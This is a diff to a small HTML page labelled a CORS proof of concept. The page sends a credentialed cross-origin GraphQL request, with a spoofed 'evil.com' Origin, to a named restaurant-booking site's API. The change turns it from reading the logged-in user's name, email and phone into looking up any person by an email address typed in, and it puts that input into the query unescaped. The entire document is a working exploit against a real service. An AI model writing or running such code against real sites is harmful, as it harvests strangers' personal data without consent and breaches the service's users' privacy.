@@ -1,25 +1,33 @@
 <html>
   <body>
-    <h2>Extracted Data:</h2>
+    <h2>CORS PoC with Email Input</h2>
+    <input type="text" id="email" placeholder="Enter email" />
+    <button onclick="fetchData()">Get Data</button>
+
+    <h3>Extracted Data:</h3>
     <pre id="output"></pre>
 
     <script>
-      fetch("https://www.thefork.com/api/graphql", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json",
-          "Origin": "https://evil.com"
-        },
-        body: JSON.stringify({
-          query: "{ user { firstName lastName email phone } }"
+      function fetchData() {
+        const email = document.getElementById("email").value;
+
+        fetch("https://www.thefork.com/api/graphql", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json",
+            "Origin": "https://evil.com"
+          },
+          body: JSON.stringify({
+            query: `{ userByEmail(email: "${email}") { firstName lastName email phone } }`
+          })
         })
-      })
-      .then(res => res.json())
-      .then(data => {
-        document.getElementById("output").innerText = JSON.stringify(data, null, 2);
-      })
-      .catch(err => console.error(err));
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+        })
+        .catch(err => console.error(err));
+      }
     </script>
   </body>
 </html>
